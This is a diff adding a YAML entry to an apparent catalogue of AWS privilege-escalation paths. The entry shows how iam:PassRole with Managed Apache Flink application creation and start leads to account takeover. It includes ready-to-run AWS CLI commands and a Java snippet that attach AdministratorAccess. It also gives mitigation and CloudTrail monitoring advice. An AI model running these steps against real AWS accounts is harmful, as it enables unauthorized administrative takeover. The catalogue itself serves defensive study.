@@ -1,0 +1,270 @@
+id: kinesisanalytics-001
+name: iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication
+category: new-passrole
+services:
+  - iam
+  - kinesisanalytics
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role to the Kinesis Data Analytics service
+    - permission: kinesisanalytics:CreateApplication
+      resourceConstraints: No resource constraints required
+    - permission: kinesisanalytics:StartApplication
+      resourceConstraints: No resource constraints required; note that the IAM permission namespace is kinesisanalytics even for v2 (Managed Apache Flink) API calls
+  additional:
+    - permission: kinesisanalytics:DescribeApplication
+      resourceConstraints: Useful for polling application status to confirm execution
+    - permission: kinesisanalytics:ListApplications
+      resourceConstraints: Helpful for discovering existing applications
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `kinesisanalytics:CreateApplication`, and `kinesisanalytics:StartApplication` can escalate privileges by creating a Managed Apache Flink application (Amazon Kinesis Data Analytics v2) with an admin service execution role. Once the application starts, the Flink job code runs using the execution role's credentials and calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. Note that while the SDK uses the `kinesisanalyticsv2` namespace, the IAM permission uses the `kinesisanalytics` namespace for both v1 and v2 APIs.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts kinesisanalytics.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - An S3 bucket must be accessible containing the malicious Flink application JAR
+  lateral:
+    - A role must exist that trusts kinesisanalytics.amazonaws.com and has elevated permissions
+    - An S3 bucket must be accessible containing the Flink application JAR
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Build a Flink JAR that calls iam:AttachUserPolicy using the execution role credentials.
+        # The JAR entry point should use the AWS SDK for Java or Python (via PyFlink) to:
+        #   iam_client.attach_user_policy(
+        #     UserName="STARTING_USER",
+        #     PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+        #   )
+
+        aws s3 cp malicious-flink-app.jar s3://CODE_BUCKET/exploit/malicious-flink-app.jar
+      description: Build a Flink application JAR containing code that uses the execution role's credentials (injected automatically by the Flink AWS credential provider) to call iam:AttachUserPolicy. Upload it to S3.
+    - step: 2
+      command: |
+        aws kinesisanalyticsv2 create-application \
+          --application-name privesc-flink-app \
+          --runtime-environment FLINK-1_19 \
+          --service-execution-role arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --application-configuration '{
+            "ApplicationCodeConfiguration": {
+              "CodeContent": {
+                "S3ContentLocation": {
+                  "BucketARN": "arn:aws:s3:::CODE_BUCKET",
+                  "FileKey": "exploit/malicious-flink-app.jar"
+                }
+              },
+              "CodeContentType": "ZIPFILE"
+            },
+            "FlinkApplicationConfiguration": {
+              "ParallelismConfiguration": {
+                "ConfigurationType": "CUSTOM",
+                "Parallelism": 1,
+                "ParallelismPerKPU": 1,
+                "AutoScalingEnabled": false
+              }
+            }
+          }'
+      description: Create the Flink application, passing the admin role as the serviceExecutionRole via iam:PassRole. Note that the SDK API is kinesisanalyticsv2 but the IAM permission is kinesisanalytics:CreateApplication.
+    - step: 3
+      command: |
+        aws kinesisanalyticsv2 start-application \
+          --application-name privesc-flink-app \
+          --run-configuration '{}'
+      description: Start the Flink application. Once it transitions to RUNNING, the malicious Flink job executes with the admin execution role's credentials and attaches AdministratorAccess to the starting user.
+    - step: 4
+      command: |
+        aws kinesisanalyticsv2 describe-application \
+          --application-name privesc-flink-app \
+          --query 'ApplicationDetail.ApplicationStatus' \
+          --output text
+      description: Poll application status. Once RUNNING, check for IAM policy attachment to confirm escalation succeeded.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative Kinesis Data Analytics execution roles** - Very rarely does a Flink application need administrative IAM access. Use the principle of least privilege and scope execution roles to only the Kinesis streams, S3 buckets, and services the application legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificFlinkRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "kinesisanalytics.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Note on IAM permission namespace**: The IAM permission for Managed Apache Flink (v2 API) uses the `kinesisanalytics` prefix, not `kinesisanalyticsv2`. Policy restrictions must use `kinesisanalytics:CreateApplication` and `kinesisanalytics:StartApplication`.
+  - Monitor CloudTrail for unusual Kinesis Data Analytics application creation followed by immediate starts
+  - Monitor CloudTrail for applications created by principals who do not usually create analytics applications
+  - Monitor CloudTrail for roles being passed to the kinesisanalytics service that haven't been used before
+  - Alert on IAM policy attachment events originating from Kinesis Data Analytics execution roles
+  - Regularly audit all IAM roles that trust kinesisanalytics.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed execution role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks. The Flink application typically takes 2-5 minutes to reach RUNNING state.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon Kinesis Data Analytics - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonkinesisdataanalytics.html"
+  - title: "Security best practices for Managed Service for Apache Flink"
+    url: "https://docs.aws.amazon.com/managed-flink/latest/java/security-best-practices.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/kinesisanalytics-001-iam-passrole+kinesisanalytics-createapplication+kinesisanalytics-startapplication"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with iam:PassRole, kinesisanalytics:CreateApplication, and kinesisanalytics:StartApplication permissions. Note that both IAM permissions use the kinesisanalytics namespace even when targeting the v2 (Managed Apache Flink) API. Can be an IAM user or role.
+
+    - id: flink_app
+      label: New Managed Apache Flink Application
+      type: resource
+      description: |
+        New Managed Apache Flink application (Amazon Kinesis Data Analytics v2) created with the privileged IAM role passed as the serviceExecutionRole. The application references a malicious Flink JAR in S3 as its code content. AWS manages all Flink cluster infrastructure. Once the application is started, the Flink job manager and task managers run with the execution role's credentials automatically injected by the Kinesis Data Analytics service.
+
+    - id: exec_role
+      label: Service Execution Role
+      type: principal
+      description: |
+        IAM role passed to the Flink application as the serviceExecutionRole via iam:PassRole. The role must trust kinesisanalytics.amazonaws.com to assume it. When the application reaches RUNNING state, the Flink job code executes with this role's credentials available through the AWS SDK credential provider chain (via the container metadata service).
+
+    - id: flink_code
+      label: Flink Job Code (JAR)
+      type: payload
+      color: '#99ccff'
+      description: |
+        Malicious Flink application JAR uploaded to S3 and referenced via `ApplicationCodeConfiguration.CodeContent.S3ContentLocation`. The JAR's main job entry point uses the AWS SDK (Java or PyFlink) to call IAM APIs with the service execution role's credentials, which are automatically available via the Flink AWS credential provider.
+
+        The JAR entry point logic:
+        ```java
+        // Using AWS SDK for Java inside the Flink job
+        AmazonIdentityManagement iam = AmazonIdentityManagementClientBuilder.defaultClient();
+        AttachUserPolicyRequest request = new AttachUserPolicyRequest()
+            .withUserName("STARTING_USER")
+            .withPolicyArn("arn:aws:iam::aws:policy/AdministratorAccess");
+        iam.attachUserPolicy(request);
+        ```
+
+        The JAR is specified via `--application-configuration ApplicationCodeConfiguration.CodeContent.S3ContentLocation` in the CreateApplication call.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The service execution role has AdministratorAccess or equivalent permissions. The Flink job code successfully calls iam:AttachUserPolicy, elevating the starting principal to full administrative access across the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The service execution role has some elevated permissions but not full admin. The Flink job can leverage these permissions for data exfiltration from Kinesis streams, S3, or DynamoDB, modification of security configurations, or staging further privilege escalation.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The service execution role only has minimal permissions. The Flink job executes but cannot perform meaningful privilege escalation. Note that the Flink application takes 2-5 minutes to reach RUNNING state, making this outcome more costly to discover.
+
+  edges:
+    - from: start
+      to: flink_app
+      label: iam:PassRole + kinesisanalytics:CreateApplication
+      description: |
+        Create the Flink application and pass the admin role as the serviceExecutionRole. The application configuration references the malicious JAR in S3. Note the SDK uses the kinesisanalyticsv2 namespace while the IAM permission uses kinesisanalytics.
+
+        Command:
+        ```bash
+        aws kinesisanalyticsv2 create-application \
+          --application-name privesc-flink-app \
+          --runtime-environment FLINK-1_19 \
+          --service-execution-role arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --application-configuration '{
+            "ApplicationCodeConfiguration": {
+              "CodeContent": {
+                "S3ContentLocation": {
+                  "BucketARN": "arn:aws:s3:::CODE_BUCKET",
+                  "FileKey": "exploit/malicious-flink-app.jar"
+                }
+              },
+              "CodeContentType": "ZIPFILE"
+            },
+            "FlinkApplicationConfiguration": {
+              "ParallelismConfiguration": {
+                "ConfigurationType": "CUSTOM",
+                "Parallelism": 1,
+                "ParallelismPerKPU": 1,
+                "AutoScalingEnabled": false
+              }
+            }
+          }'
+        ```
+
+    - from: flink_app
+      to: exec_role
+      label: kinesisanalytics:StartApplication
+      description: |
+        Start the Flink application. The Kinesis Data Analytics service assumes the serviceExecutionRole and injects its credentials into the Flink cluster environment. The application transitions through STARTING to RUNNING over 2-5 minutes.
+
+        Command:
+        ```bash
+        aws kinesisanalyticsv2 start-application \
+          --application-name privesc-flink-app \
+          --run-configuration '{}'
+        ```
+
+    - from: exec_role
+      to: flink_code
+      label: Application runs as execution role
+      description: |
+        Once the application reaches RUNNING state, the Flink job manager loads the malicious JAR and executes the job entry point. The AWS SDK within the JAR automatically discovers the service execution role's credentials through the container metadata service, making IAM API calls without any explicit credential configuration.
+
+    - from: flink_code
+      to: admin
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: |
+        If the service execution role has AdministratorAccess or IAM write permissions (iam:AttachUserPolicy), the Flink job code successfully attaches AdministratorAccess to the starting principal. The privilege escalation is confirmed by checking IAM after the application reaches RUNNING state.
+
+    - from: flink_code
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the service execution role has elevated but non-admin permissions, the Flink job can still access Kinesis streams, read from S3, interact with databases, or perform other privileged actions within the role's permission boundary.
+
+    - from: flink_code
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the service execution role only has minimal permissions, the Flink job cannot perform meaningful privilege escalation. The 2-5 minute startup time makes this a slower path to discover the limited outcome.
